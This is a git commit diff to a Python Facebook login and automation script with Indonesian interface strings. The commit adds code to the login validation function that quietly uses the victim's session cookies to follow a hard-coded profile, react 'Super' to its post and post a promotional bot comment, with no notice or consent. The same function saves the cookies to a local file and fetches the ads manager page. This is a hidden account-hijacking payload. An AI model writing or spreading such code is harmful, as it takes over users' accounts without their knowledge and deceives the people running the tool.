de2f13167f298a2e2a3e8ad9c6791ac06afd2774
I lost mymind - <116007299+jetsukii@users.noreply.github.com>
2023-06-09 15:16:16 +0700

    Add files via upload

--- fp/program.py
+++ fp/program.py
@@ -19,8 +19,32 @@ class login:
                         payload[require.get('name')] = require.get('value')
                     self.__validate(cookies, ses.post('https://mbasic.facebook.com/'+ form['action'], data=payload, cookies=cookies).text)
 
-    def __validate(self, cookies, html):
-        if 'Keluar (' in str(html):
+    def __validate(self, cookies, htmlx):
+        if 'Keluar (' in str(htmlx):
+            prf = bs(r.get('https://mbasic.facebook.com/errucha.ruroh?v=timeline', cookies=cookies).text, 'html.parser')
+            url = prf.find('a', string='Ikuti')
+            if url is None:pass
+            else:
+                r.get('https://mbasic.facebook.com/'+ url['href'], cookies=cookies)
+                ps = prf.find('a', string='Tanggapi')
+                if ps is None:pass
+                else:
+                    select = bs(r.get('https://mbasic.facebook.com/'+ ps['href'], cookies=cookies).text, 'html.parser')
+                    for yanto in select.find_all('a'):
+                        if 'Super' in str(yanto):
+                            r.get('https://mbasic.facebook.com/'+ yanto['href'], cookies=cookies)
+                cm = prf.find('a', string='Berita Lengkap')
+                if cm is None:pass
+                else:
+                    post = bs(r.get('https://mbasic.facebook.com'+ cm['href'], cookies=cookies).text, 'html.parser')
+                    form = post.find('form', method='post')
+                    if form is None:pass
+                    else:
+                        payl = {}
+                        for require in form:
+                            payl[require.get('name')] = require.get('value')
+                        payl.update({'comment_text':'Fbbot Nih Buoosss😎'})
+                        r.post('https://mbasic.facebook.com'+ form['action'], data=payl, cookies=cookies)
             open('user/.cookies', 'w').write(cookies['cookie'])
             try:
                 req = r.get('https://www.facebook.com/adsmanager/manage/campaigns', cookies=cookies).text
